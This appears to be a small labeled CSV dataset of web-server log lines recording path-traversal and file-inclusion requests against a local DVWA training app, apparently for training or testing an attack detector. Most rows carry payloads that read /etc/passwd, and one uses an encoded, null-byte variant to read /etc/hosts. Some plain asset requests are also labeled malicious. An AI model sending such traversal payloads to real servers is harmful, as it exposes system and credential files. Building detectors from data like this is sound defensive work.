url,malicious
"127.0.0.1 - - [28/Apr/2021:22:11:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../etc/passwd HTTP/1.1"" 200 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:12:20 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1"" 200 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:13:01 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../etc/passwd HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:14:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1"" 200 2422 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:27:19 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../etc/passwd HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:28:10 -0400] ""GET /DVWA/vulnerabilities/fi/?page=././././././././././././etc/passwd HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:28:23 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd HTTP/1.1"" 200 2422 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
